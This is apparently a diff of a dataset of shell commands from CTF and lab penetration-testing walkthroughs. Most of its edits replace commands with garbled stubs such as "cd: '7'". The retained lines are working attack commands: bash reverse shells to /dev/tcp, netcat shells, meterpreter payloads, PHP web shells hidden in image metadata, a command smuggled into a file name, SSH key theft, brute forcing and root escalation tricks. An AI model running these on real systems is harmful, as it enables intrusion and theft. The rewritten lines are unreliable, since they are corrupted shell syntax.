 ls
 type root.txt
 nmap -sV -sC 10.129.109.173
@@ -11734,35 +11734,35 @@ nano /etc/hosts
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")'
 pwd
-cd /var/www/html
+cd: '7'
 ls
-cd Cu
-cd cdata
+cd: '7'
+cd: '7'
 ls
-cd users
+cd: '7'
 ls
 cat b0.php
-su paul
-cd paul
-ls -la
+su: '2'
+cd: '7'
+ls: '406'
 cat user.txt
-cd .ssh
-ls -la
+cd: '7'
+ls: '406'
 cat id_rsa
 cat id_rsa.pub
 nano key
 chmod 600 key
 ssh -i key nadav@10.129.109.173
-cd /tmp
+cd: '7'
 wget 10.10.14.38:8000/lenpeas.sh
 chmod 777 lenpeas.sh
-gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/raj.txt true
+gdbus
 ls
 cat raj.txt
 nano rootkey
 chmod 600 rootkey
 ssh -i rootkey root@10.129.109.173
-cd /root
+cd: '7'
 cat root.txt
 gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/shell_rsa true
 ssh -i shell_rsa root@127.0.0.1
@@ -11771,7 +11771,7 @@ cat root.txt
 nmap -sC 10.129.104.163
 john -w=/usr/share/wordlists/rockyou.txt bill
 nc -lvp 1234
-ls -la
+ls: '404'
 cat user.txt
 cat .google_authenticator
 sudo -l
@@ -11780,71 +11780,71 @@ sudo -l
 sudo -l
 sudo gem open -e "/bin/sh -c /bin/sh" rdoc
 id
-cd /root
+cd: '7'
 cat root.txt
 nmap -A 10.129.101.34
 smbclient -L 10.129.101.34
 smbclient \\\\10.129.101.34\\Data
-cd Shared\
-cd Templates\
-cd HR\
-cd Maintenance
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
 cat 'Welcome Email.txt'
 smbclient \\\\10.129.101.34\\Data -U TempUser
-cd IT
-cd Configs
-cd "RU Scanner"
-cd Configs
-cd NotepadPlusPlus
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
 cat RU_config.xml
 smbclient \\\\10.129.101.34\\Secure -U TempUser
-cd IT
-cd Carl
-cd "VB Projects"
-cd WIP
-cd RU
-cd RUScanner
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
+cd: '7'
 smbclient \\\\10.129.101.34\\users -U C.Smith
-cd C.Smith
+cd: '7'
 exit
 cat user.txt
 smbclient \\\\10.129.101.34\\users -U C.Smith
-cd C.Smith
-cd "HQK Reporting"
+cd: '7'
+cd: '7'
 exit
 cat 'Debug Mode Password.txt'
 cat HQK_Config_Backup.xml
 cat DEBUGM~1.txt: password
 telnet 10.129.101.34 4386
-cd "AD Integration Module"
-cd C:\Users\Administrator\Desktop\
+cd: '7'
+cd: '7'
 type root.txt
 nmap -sC -sV 10.129.1.152
 enum4linux 10.129.1.152
 hydra -L user.txt -p Welcome123! 10.129.1.152 smb
 evil-winrm -i 10.129.1.152 -u melanie -p 'Welcome123!'
-cd C:\Users\melanie\Desktop
+cd: '7'
 type user.txt
-ls -force
+ls: '404'
 evil-winrm -i 10.129.1.152 -u ryan -p 'Serv3r4Admin4cc123!'
-whoami /groups
+whoami: '25'
 nc -lvp 4444
-cd c:\\Users\Administrator\Desktop
+cd: '7'
 type root.txt
 nmap -sC -sV 10.129.1.147
 smbclient -L 10.129.1.147
 smbclient //10.129.1.147/Reports
 file 'Currency Volume Report.xlsm'
 unzip 'Currency Volume Report.xlsm'
-cd xl
+cd: '7'
 strings vbaProject.bin
 git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket
+cd: '7'
 python setup.py install
 john -w=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.129.1.147.txt
-cd /usr/share/windows-binaries
+cd: '7'
 python -m SimpleHTTPServer
-cd c:\users\mssql-svc
+cd: '7'
 evil-winrm -i 10.129.1.147 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
 nmap -sC -sV 10.129.39.140
 gobuster dir -u http://10.129.39.140 -w /usr/share/wordlists/dirb/common.txt
@@ -11875,16 +11875,16 @@ searchsploit -m 45161
 python 45161 http://hms.htb -u openemr_admin -p xxxxxx -c '/bin/bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'
 nc -lvp 4444
 id
-cd /home
-su ash
+cd: '7'
+su: '2'
 id
 cat user.txt
-ss -tnl
+ss
 telnet localhost 11211
-su luffy
+su: '2'
 id
 docker image ls
-cd /mnt
+cd: '7'
 ls
 cat root.txt
 nmap -sV -sC 10.129.1.55
@@ -11894,7 +11894,7 @@ cat user.txt
 wget 10.10.14.64:8000/pspy64
 chmod 777 pspy64
 git clone https://github.com/whotwagner/logrotten.git
-cd logrotten
+cd: '7'
 gcc -o logrotten logrotten.c
 python -m SimpleHTTPServer
 wget 10.10.14.64:8000/logrotten
@@ -11903,7 +11903,7 @@ nano ignite
 cp /root/.ssh/id_rsa /tmp/key; chmod +r /tmp/key
 ls
 ssh -i key root@127.0.0.1
-cd root
+cd: '7'
 cat root.txt
 nmap -A 10.129.77.180
 mkdir /tmp/raj
@@ -11911,18 +11911,18 @@ mount -t nfs 10.129.77.180:/site_backups /tmp/raj
 strings Umbraco.sdf | grep admin
 john –wordlist=/usr/share/wordlists/rockyou.txt hash
 git clone https://github.com/noraj/Umbraco-RCE
-cd Umbraco-RCE
+cd: '7'
 pip3 install -r requirements.txt
 set target 2
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 10.10.14.52
 set srvhost 10.10.14.52
 pwd
-cd C:\Users\Public
+cd: '7'
 cat user.txt
-cd Program Files (x86)
+cd: '7'
 ls
-cd TeamViewer
+cd: '7'
 ls
 set session 1
 gem install evil-winrm
@@ -11931,15 +11931,15 @@ nmap -sV 10.129.77.148
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' 1.png
 mv 1.png shell.php.png
 nc -lvp 1234
-cd /var/www/Magic/
+cd: '7'
 cat db.php5
-mysqldump Magic -u theseus -p
-su theseus
-cd theseus
+mysqldump
+su: '2'
+cd: '7'
 cat user.txt
 find / -perm -u=s 2>/dev/null
 strings /bin/sysinfo
-cd /tmp
+cd: '7'
 echo "/bin/bash" > free
 chmod 777 free
 export PATH=/tmp:$PATH
@@ -11950,22 +11950,22 @@ echo "../.ssh/id_rsa" | base64
 sudo /usr/bin/nc 10.10.14.85 4444 -e /bin/sh
 nc -lvp 4444
 id
-cd /root
+cd: '7'
 cat root.txt
 nmap -sC -sV 10.129.2.5
 cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
 hydra -L users.txt -P pwd.txt 10.129.2.5 smb
 smbclient -L 10.129.2.5 -U tlavel
-smbpasswd -r 10.129.2.5 -U tlavel
+smbpasswd
 rpcclient -U tlavel 10.129.2.5
 evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'
-whoami /priv
+whoami: '25'
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f exe > shell.exe
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 10.10.14.52
 ls
-cd Administrator
-cd Desktop
+cd: '7'
+cd: '7'
 cat root.txt
 nmap -A -p- 10.10.10.209
 nmap -p- -A 192.168.1.32
@@ -11973,7 +11973,7 @@ sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
 nmap -sC -sV -p- 192.168.1.31
 ssh '<?php system($_GET['c']); ?>'@192.168.1.31
 nc -lvp 1234
-cd /root
+cd: '7'
 ls
 cat flag.txt
 nmap -p- -A cybox.thm
@@ -11987,20 +11987,20 @@ set rhosts 192.168.0.163
 set username atri
 set password anasuya
 ssh atri@192.168.0.163
-cd /home
+cd: '7'
 ls
-su vedas
+su: '2'
 sudo -l
 sudo bash
-cd /root
+cd: '7'
 ls
 cat final.txt
 netdiscover
 nmap -sV 192.168.0.170
 hydra -l harshit -P /usr/share/wordlists/rockyou.txt 192.168.0.170 pop3s
 openssl s_client -crlf -connect 192.168.0.170:110 -starttls pop3
-pass superman
-volatility -f john.mem imageinfo
+pass
+volatility
 volatility -f john.mem –profile=WinXPSPx86 notepad
 set hosts 192.168.0.170
 set username mycroft
@@ -12008,13 +12008,13 @@ set password Khufiya
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 john hash --show
 echo "QmhlZGl5YQ=" | base64 -d
-su sherlock
+su: '2'
 sudo -l
 sudo bash
-cd /root
+cd: '7'
 cat final.txt
 cat 25_Point.txt
-netdiscover -i ethX
+netdiscover: '111'
 nmap -A –p- 192.168.10.167
 netdiscover
 dirb http://192.168.0.174/
@@ -12035,22 +12035,22 @@ set rhosts 172.17.0.2
 set port 1-100
 ftp 172.17.0.2
 ls
-cd pub
+cd: '7'
 ls
 exit
 ls
 python -m SimpleHTTPServer
-cd /home
+cd: '7'
 ls
-su forensics
+su: '2'
 sudo -l
 sudo bash
-cd /root
+cd: '7'
 cat root.txt
 nmap -A 192.168.1.110
 ftp 192.168.1.110
 ls
-cd pub
+cd: '7'
 ls
 cat NOTES.txt
 msfvenom -p cmd/unix/reverse_python lhost=192.168.1.112 lport=1234 R
@@ -12068,22 +12068,22 @@ sudo -l
 sudo -u evdaez /scripts/whatsmyid.sh
 sudo -l
 sudo -u resercherx socat tcp-connection:$RHOST:$RPORT exec:/bin/sh.pty,stderr,setsid,sigint,sane
-socat file:'tty',raw,echo=0 tcp-listen:12345
+socat
 python -c 'import pty;pty.spawn("/bin/bash")'
 sudo -l
 echo 'exec /bin/sh' > $TF/x.sh
 ls
 python -m SimpleHTTPServer
-cd /tmp
+cd: '7'
 wget http://192.168.1.112:8000/s_1.0_all.deb
 sudo dpkg -i x_1.0_all.deb
 id
-cd /root
+cd: '7'
 ls
 cat root.txt
-netdiscover -i ethX
+netdiscover: '110'
 nmap -A –p- tempusf3.vh
-netdiscover -i ethX
+netdiscover: '110'
 nmap -A –p- insanity.vh
 nmap -p- -A 192.168.0.165
 smbclient -L \\192.168.0.165
@@ -12095,7 +12095,7 @@ hydra -l goper -P /usr/share/wordlists/rockyou.txt 192.168.0.165 ftp
 ftp 192.168.0.165
 ls
 cat status.py
-bash -i >& /dev/tcp/192.168.0.147/8080 0>&1
+bash: '7'
 ftp 192.168.0.165
 ls
 nc -lvp 8080
@@ -12106,51 +12106,51 @@ nc -lvp 8888
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 chmod 777 pspy64
 export TERM=xterm
-tmux -S /opt/.tmux-0/sockets/default attach
+tmux
 id
-cd /root
+cd: '7'
 ls
 cat proof.txt
-netdiscover -i ethX
+netdiscover: '110'
 nmap -A –p- powergrid.vh
-netdiscover -i ethX
+netdiscover: '110'
 nmap -A –p- 192.168.10.161
 nmap -A 192.168.0.136
 dirb http://192.168.0.136/
 dirb http://192.168.0.136/ -X .txt
 nmap -sU -p69 192.168.0.136
-tftp 192.168.0.136
+tftp
 echo "eWFtZG9vdDpTd2FyZw==" | base64 -d
 nc -lvp 1234
 find / -type f -perm -ug=rwx 2>/dev/null
 cat /mnt/hell.sh
-cd /home
+cd: '7'
 ls
-cd inferno
-ls -la
+cd: '7'
+ls: '382'
 cat user.txt
 ssh inferno@192.168.0.136
 which nano
-ls -la /bin/nano
+ls: '382'
 echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
 ssh inferno@192.168.0.136
-ls -al /bin/nano
+ls: '382'
 nano /etc/passwd
 openssl passwd -1 -salt user3 pass123
-su jeenali
-cd /root
+su: '2'
+cd: '7'
 ls
 cat root.txt
-netdiscover -i ethX
+netdiscover: '110'
 nmap -p- 192.168.10.184
 nmap -sV 192.168.0.113
 dirb http://192.168.0.113/ -X .php
 nmap -sC -sV -p 80 --script=http-enum 192.168.0.113=--
 chmod 600 key
 ssh -i key mpampis@192.168.0.113
-cd /home
+cd: '7'
 ls
-cd mpampis/
+cd: '7'
 ls
 cat user.txt
 sudo -l
@@ -12158,7 +12158,7 @@ sudo gcc -wrapper /bin/sh,-s .
 id
 ls
 cat root.txt
-netdiscover -i ethX
+netdiscover: '110'
 nmap -A –p- 192.168.10.183
 netdiscover
 nmap -A 192.168.0.163
@@ -12166,16 +12166,16 @@ dirb http://192.168.0.163:8080/
 sqlmap -u http://192.168.0.163:8080/mercuryfacts/ --dbs --batch
 ssh webmaster@192.168.0.163
 cat user_flag.txt
-cd mercury_proj/
+cd: '7'
 ls
 cat notes.txt
-su linuxmaster
+su: '2'
 sudo -l
-head -n 5 /usr/bin/check_syslog.sh
+head
 ln -s /usr/bin/vim tail
 export PATH=$(pwd):$PATH
 sudo --preserve-env=PATH /usr/bin/check_syslog.sh
-cd /root
+cd: '7'
 cat root_flag.txt
 nmap -A 192.168.1.104
 ftp 192.168.1.104
@@ -12188,32 +12188,32 @@ set target 1
 set payload php/meterpreter/reverse_tcp
 set lhost 192.168.1.112
 set lport 8888
-cd /home
+cd: '7'
 ls
-cd mitnick
+cd: '7'
 cat user.txt
-cd .ssh
+cd: '7'
 ls
 cat id_rsa.pub
 cat id_rsa
-locate ssh2john
+locate
 john –wordlist=/usr/share/wordlists/rockyou.txt hash
 ssh -i key mitnick@192.168.1.104
-cd /tmp
+cd: '7'
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
 chmod 777 pspy64s
-cd /etc/update-motd.d/
-ls -la
+cd: '7'
+ls: '374'
 nano 00-header
 chmod u+s /bin/nano
 exit
 ssh -i key mitnick@192.168.1.104
-ls -la /bin/nano
+ls: '374'
 nano /etc/passwd
 openssl paswd -1 -salt user3 pass123
 tail -n 3 /etc/passwd
-su raj
-cd /root
+su: '2'
+cd: '7'
 cat root.txt
 netdiscover
 nmap -A 192.168.0.188
@@ -12221,17 +12221,17 @@ dirb http://192.168.0.188
 dirb http://192.168.0.188/ -X .php,.js,.txt
 hydra -L users.txt -p babyYoda123 192.168.0.188 ssh
 ssh han@192.168.0.188
-ls -la
-cd .secrets
-ls -la
+ls: '374'
+cd: '7'
+ls: '374'
 cat note.txt
 tail /etc/passwd
 cewl http://192.168.0.188/r2d2 > dict.txt
 hydra -l skywalker -P dict.txt 192.168.0.188 ssh
-su skywalker
-ls -la
-cd .secrets
-ls -la
+su: '2'
+ls: '374'
+cd: '7'
+ls: '374'
 nano evil.py
 import os
 nc -lvp 1234
@@ -12240,25 +12240,25 @@ sudo -l
 echo echo "os.execute(/bin/sh)" > /tmp/nmap.nse
 sudo nmap --script=/tmp/root.nse
 id
-cd /root
+cd: '7'
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.0.121
 ftp 192.168.0.121
 ls
-cd .hannah
+cd: '7'
 chmod 600 id_rsa
 ssh -i id_rsa hannah@192.168.0.121 -p 61000
 ls
 cat user.txt
 sudo -l
 find / -perm -u=5 -type f 2>/dev/null
-cd /tmp
-cpulimit -l 100 -f mkdir /ignite
+cd: '7'
+cpulimit
 cpulimit -l 100 -f chmod 4755 /usr/bin/bash
 cpulimit -l 100 -f cp /usr/bin/bash /ignite
 cpulimit -l 100 -f chmod +s /ignite/bash
-cd /root
+cd: '7'
 ls
 cat root.txt
 netdiscover
@@ -12268,26 +12268,26 @@ sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= --dbs
 sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= -D openemr -T users --dump --batch
 nc -lvp 1234
 python -c 'import pty; pty.spawn("/bin/bash")'
-su medical
+su: '2'
 find / -perm -u=s -type f 2>/dev/null
-cd /tmp
+cd: '7'
 echo "bin/bash" > fdisk
 chmod 777 fdisk
 export PATH=/tmp:$PATH
-cd /root
+cd: '7'
 ls
-netdiscover -i ethX
+netdiscover: '106'
 nmap -A –p- 192.168.10.182
-netdiscover -i ethX
+netdiscover: '106'
 nmap -A –p- 192.168.10.179
-netdiscover -r 192.168.0.1/24
+netdiscover: '106'
 nmap -A 192.168.0.180
 dirb http://192.168.0.180
 wpscan --url http://loly.lc/wordpress --enumerate u
 wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
 nc -lvp 1234
 cat /etc/passwd
-lsb_release -a
+lsb_release
 uname –a
 python -m SimpleHTTPServer
 wget http://192.168.0.147:8000/45010.c
@@ -12309,49 +12309,49 @@ wget http://192.168.1.112:8000/revshell.sh
 set payload cmd/unix/reverse_bash
 set lhost 192.168.1.112
 set lport 9999
-bash revshell.sh
+bash: '7'
 netstat -antp
 searchsploit solr
 searchsploit -m 47572
 nc -lvp 7654
-cd /tmp
+cd: '7'
 python -c 'import pty; pty.spawn("/bin/bash")
 python -c 'import pty; pty.spawn("/bin/sh")
 sudo -l
 sudo su
-cd /root
+cd: '7'
 ls
 cat flag.txt
 netdiscover
 nmap -A 192.168.1.105
 nc -lvp 1234
 ls
-cd admin
+cd: '7'
 ls
 cat flag.txt
 find / -writeable -type d 2>/dev/null
-cd tmp
-ls -la
+cd: '7'
+ls: '367'
 echo "bash -i >& /dev/tcp/192.168.1.112/8888 0>&1" > clean.sh
 nc -lvp 8888
-cd /root
+cd: '7'
 ls
 cat root.txt
-netdiscover -r 10.0.2.0/24
+netdiscover: '104'
 sudo nmap –sV 10.0.2.20
 smbclient –N –L \\\\10.0.2.20
 python -c "import pty;pty.spawn('/bin/bash')"
 find / -perm –u=s –type f 2>/dev/null
-cd root
-bash -i >& /dev/tcp/192.168.56.102/8080 0>&1
+cd: '7'
+bash: '7'
 sudo -l
 sudo -u steven /usr/sbin/service ../../bin/bash
 bash
-netdiscover -i ethX
+netdiscover: '104'
 nmap -A –p- 192.168.10.178
-netdiscover -i ethX
+netdiscover: '104'
 nmap -A –p- 192.168.10.177
-netdiscover -i ethX
+netdiscover: '104'
 netdiscover
 nmap -A -p- 192.168.10.160
 nmap -A –p- 192.168.1.21
@@ -12365,14 +12365,14 @@ dirb http://192.168.1.104/ /usr/share/wordlists/dirb/big.txt -X .html,.php,.txt
 dirb http://192.168.1.104/ /usr/share/wordlists/dirb/big.txt
 ssh tre@192.168.1.104
 sudo -l
-ls -la check-system
+ls: '366'
 chmod +s /usr/bin/nano
 sudo shutdown -r now
-ls -la /usr/bin/nano
+ls: '366'
 openssl passwd -1 -salt user3 pass123
 tail -n 2 /etc/passwd
-su raj
-cd /root
+su: '2'
+cd: '7'
 ls
 cat root.txt
 nmap -A -p- 192.168.10.162
@@ -12390,23 +12390,23 @@ nmap -p- -A 192.168.1.104
 dirb http://192.168.1.104:7601
 hydra -l seppuku -P /root/Desktop/password.lst 192.168.1.104 ssh
 ssh seppuku@192.168.1.104
-ls -la
+ls: '365'
 cat .passwd
-cd /home
+cd: '7'
 ssh seppuku@192.168.1.104 -t "bash --noprofile"
-cd /home
-su samurai
+cd: '7'
+su: '2'
 sudo -l
 chmod 600 sshkey
 ssh -i sshkey tanto@192.168.1.104 -t "bash –noprofile"
-ls -la
+ls: '365'
 mkdir .cgi_bin
-cd .cgi_bin/
+cd: '7'
 echo "/bin/bash" > bin
 chmod 777 bin
-ls -la
+ls: '365'
 sudo ../../../../../../../home/tanto/.cgi_bin/bin /tmp/*
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -A 192.168.1.105
@@ -12416,47 +12416,47 @@ wpscan --url http://192.168.1.105/wordpress -U orange -P /usr/share/wordlist/roc
 nc -lvp 1234
 python -c 'import pty;pty.spawn("/bin/bash")
 ls
-cd /var/www/html/wordpress
+cd: '7'
 wget http://192.168.1.112:8000/LinEnum.sh
 chmod 777 LinEnum.sh
 cat /etc/crontab
-cd /etc/logrotate.d
-ls -la
+cd: '7'
+ls: '363'
 msfvenom -p /cmd/unix/reverse_netcat lhost=192.168.1.112 lport=4444 R
 echo "code here" > logrotate
 nc -lvp 4444
 id
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -p- -A 192.168.1.104
-aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
+aircrack-ng
 ssh dlink@192.168.1.104
 find / -writable -type d 2>/dev/null
-cd /var/www/bolt/public/files
-ls -la
-cd files/
-ls -la
+cd: '7'
+ls: '362'
+cd: '7'
+ls: '362'
 wget http://192.168.1.112:8000/php-reverse-shell-php
 ls
 nc -lvp 1234
 id
-cd /root
+cd: '7'
 ls
 cat flag.txt
 find / -writable -type d 2>/dev/null
-nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
+nohup
 id
-cd /root
+cd: '7'
 ls
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.1.104
 nikto -h http://192.168.1.104
 gcc -pthread c0w.c -o c0w
-cd /tmp
+cd: '7'
 python -c 'import pty; pty.spawn("/bin/sh")
-cd /root
+cd: '7'
 cat root.txt
 nmap -p- -A 192.168.1.109
 cewl http://192.168.1.109/ -w dict.txt
@@ -12471,11 +12471,11 @@ ssh trevor@192.168.1.105
 sudo -l
 echo 'exec /bin/sh' > $TF/x.sh
 python -m SimpleHTTPServer
-cd /tmp
+cd: '7'
 wget http://192.168.1.112:8000/x_1.0_all.deb
 sudo dpkg -i x_1.0_all.deb
 id
-cd /root
+cd: '7'
 ls
 cat flag.txt
 nmap -p- -A 192.168.1.104
@@ -12483,23 +12483,23 @@ dirb http://192.168.1.104/ -X .txt
 ssh first_stage@192.168.1.104
 ls
 cat user.txt
-cd /home
+cd: '7'
 ls
-cd mhz_cif
+cd: '7'
 ls
-cd Paintings
+cd: '7'
 ls
 mkdir raj
-cd raj
-scp first_stage@192.168.1.104:/home/mhz_c1f/Paintaings/* .
+cd: '7'
+scp
 steghide extract -sf spinning/ the/ wool.jpeg
 cat remb2.txt
-su mhz_cif
+su: '2'
 id
 sudo su
-cd /root
+cd: '7'
 ls
-ls –la
+ls: '353'
 cat .root.txt
 netdiscover
 nmap -p- -A 192.168.1.106
@@ -12509,13 +12509,13 @@ sqlmap -u http://192.168.1.106/masteradmin/login.php --forms --dbs --batch
 sqlmap -u http://192.168.1.106/masteradmin/login.php --forms -D cengbox --dump-all --batch
 mv php-reverse-shell.php shell.ceng
 nc -lvp 1234
-stty raw -echostty raw -echo
-su cengover
+stty
+su: '2'
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 chmod 777 pspy64s
 set lhost 192.168.1.112
 set lport 6789
-cd /root
+cd: '7'
 ls
 cat root.txt
 netdiscover
@@ -12523,21 +12523,21 @@ nmap -sV 192.168.1.105
 dirb http://192.168.1.105/ -X .txt
 crunch 8 8 -t @@@train > password.txt
 hydra -l sheldon -P password.txt http-get://192.168.1.105/the_real_secret_dir -e nsr
-stegsnow -C stegno.txt > result.txt
+stegsnow
 nmap 192.168.1.105
 ssh sheldon@192.168.1.105
 id
 ls
 cat flag.txt
-cd Desktop
+cd: '7'
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd Desktop
-ls -al
+cd: '7'
+ls: '351'
 cat .iliketrains.c
 echo "/bin/bash" > sl
 chmod 777 sl
 export PATH=/home/sheldon/Desktop:$PATH
-cd /root
+cd: '7'
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.1.11
@@ -12548,7 +12548,7 @@ nmap -p- -A 192.168.1.133
 hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh
 ssh geisha@192.168.1.133
 find / -perm -u=s -type f 2>/dev/null
-base32 "/etc/shadow" | base32 --decode
+base32
 base32 "/root/.ssh/id_rsa" | base32 --decode
 nano key
 chmod 600 key
@@ -12572,15 +12572,15 @@ set lhost 192.168.1.145
 set payload php/meterpreter/reverse_tcp
 set srvport 4445
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd /home
+cd: '7'
 ls
-cd vuluni
+cd: '7'
 cat flag.txt
 uname -r
-cd /tmp
+cd: '7'
 wget http://192.168.1.145/dirtycow.c
 gcc dirtycow.c -0 root -pthread
-cd /root
+cd: '7'
 ls
 cat flag.txt
 nmap -A 10.10.10.157
@@ -12597,10 +12597,10 @@ python -m SimpleHTTPServer
 wget http://10.10.14.10:8000/41154.sh
 wget http://10.10.14.10:8000/libhax.so
 wget http://10.10.14.10:8000/rootshell
-cd /etc
-umask 000
+cd: '7'
+umask
 whoami
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -p- -A 192.168.1.105
@@ -12608,17 +12608,17 @@ dirb http://192.168.1.105
 wpscan --url http://192.168.1.105/music/wordpress/
 set rhosts 192.168.1.105
 set target uri /music/wordpress
-cd /home
+cd: '7'
 ls
-cd amy
+cd: '7'
 ls
 cat notes.txt
 strings secretdiary
-cd penny
+cd: '7'
 ls
 cat .FLAG.penny.txt
 echo "<hash>" | base64 -d
-cd leonard
+cd: '7'
 ls
 cat thermostat_set_temp.sh
 cat /etc/crontab
@@ -12628,33 +12628,33 @@ ls
 cat thermostat_set_temp.sh
 nc -lvp 1234
 id
-cd /root
+cd: '7'
 ls
 cat Flag-leonard.txt
 ls
-cd private
+cd: '7'
 ls
 cat db_config.php
 python -c 'import pty;pty.spawn("/bin/bash")'
 mysql -u bigpharmacorp -p
-cd /var/www/html/music/wordpress
+cd: '7'
 ls
 cat wp-config.php
 mysql -u footprintsonthemoon
 ftp 192.168.1.105
 ls
-cd pub
+cd: '7'
 ls
-cd howard
+cd: '7'
 ls
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt super_secret_nasa_stuff_here.zip
 unzip super_secret_nasa_stuff.zip
 cat /root/marsroversketch.jpg.out
 nmap -p- 10.10.10.160
-ssh-keygen -t rsa -f raj
+ssh-keygen: '8'
 cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 ssh -i raj redis@10.10.10.160
-ls -la
+ls: '336'
 cat .bash_history
 find /-user Matt 2>/dev/null
 python /usr/share/john/ssh2john key > sshkey > hash
@@ -12667,18 +12667,18 @@ wget http://192.168.1.6:9633/idcard.png
 ls
 import socket,subprocess,os
 ls
-cd flag
+cd: '7'
 cat ctf2.py
 git clone https://github.com/epinna/tplmap.git
-cd tplmap/
+cd: '7'
 ls
 python tplmap.py -u "https://192.168.1.6:15000/page?name=*" --os-shell
 sudo -l
 echo $PATH
-ls /usr/local/sbin
+ls: '333'
 which ls
-ls -la /bin/ls
-ls -la /usr/local/sbin
+ls: '333'
+ls: '333'
 nano /usr/local/sbin/ls
 nc -lvp 1234
 netdiscover
@@ -12701,7 +12701,7 @@ openssl passwd -1 -salt raj pass123
 netdiscover
 nmap -sV -p- 192.168.0.109
 git clone https://github.com/esmog/nodexp.git
-cd nodexp/
+cd: '7'
 ls
 python nodexp.py --url="http://192.168.0.109:8081/?name=[INJECT_HERE]"
 python -c 'import pty; pty.spawn("/bin.bash")'
@@ -12712,8 +12712,8 @@ ip addr
 ls
 cat tdl.txt
 logout
-ls -a
-cd ftp
+ls: '331'
+cd: '7'
 ls
 cat tdl.txt
 gcc exploit.c -o exploit
@@ -12722,22 +12722,22 @@ wget http://192.168.0.106:8000/exploit
 chmod 4755 exploit
 logout
 ls
-ls -a
-cd /root
+ls: '329'
+cd: '7'
 cat root.txt
 nmap -p- -A 192168.29.151
 ftp 192.168.29.151
-cd /pub
+cd: '7'
 set target 1 <php>
 set lhost 192.168.29.208
 set payload php/meterpreter/reverse_tcp
-cd /tmp
+cd: '7'
 echo "printf "tom"" > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
 echo path
-cd /home/tom
-cd /root
+cd: '7'
+cd: '7'
 cat flag.txt
 nmap -p- -A 192.168.29.123
 smbmap -H 192.168.29.123
@@ -12749,7 +12749,7 @@ set target 1 <php>
 set lhost 192.168.29.208
 set lport 4444
 set payload php/meterpreter/reverse_tcp
-cd /var/www/html
+cd: '7'
 cat finally.sh
 cat write.sh
 nmap -A 10.10.10.115
@@ -12757,20 +12757,20 @@ strings needle.jpg
 echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" |base64 -d
 echo "cGFzczogc3BhbmlzaC5pcy5rZXk" | base64 -d
 ssh security@10.10.10.115
-ps aux | grep kibana
+ps: '2'
 curl http://127.0.0.1:5601
 curl -O http://10.10.14.12:8000/raj.js
 curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/raj.js
 python -c 'import pty;pty.spawn("/bin/bash")'
 find / -group kibana 2>/dev/null | grep -v proc
 echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" > /opt/kibana/logstash_raj
-cd /root
+cd: '7'
 cat root.txt
 nmap -A 10.10.10.146
 exiftool -Comment='<?php system("nc 10.10.14.15 1234 -e /bin/bash"); ?>' 1.png
 nc -lvp 1234
-cd /var/www/html/uploads
-touch '; nc 10.10.14.15 8888 -c bash'
+cd: '7'
+touch
 nc -lvp 8888
 netdiscover
 nmap -A 192.168.43.100
@@ -12778,68 +12778,68 @@ nc -lvp 6666
 python -c 'import pty; pty.spawn("/bin/sh")'
 whoami
 bash
-cd /root
+cd: '7'
 ls
 cat message.txt
-ls -la
-cd .ncftp
-ls -la
+ls: '328'
+cd: '7'
+ls: '328'
 cat trace.234
 cat /proc/1/cgroup
 nc -zv 172.19.0.12 21
-lftp someuser@172.19.0.12
+lftp
 ls
 cat cmscreds.txt
-ls -la
+ls: '327'
 cat .python_history
-apk add nmap
+apk
 nmap -sn 172.19.0.0/16
 nmap 172.19.0.1
 msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.219 lport=1234 -f elf > payload.elf
 python -m SimpleHTTPServer 80
 wget http://192.168.43.219/payload.elf
 chmod 777 payload.elf
-ls /etc/
+ls: '327'
 cat /etc/hosts
 cat /etc/resolv.conf
 apk add bind-tools
 dig axfr mofo.pwn
 netstat -ntlp
-kill 9
+kill
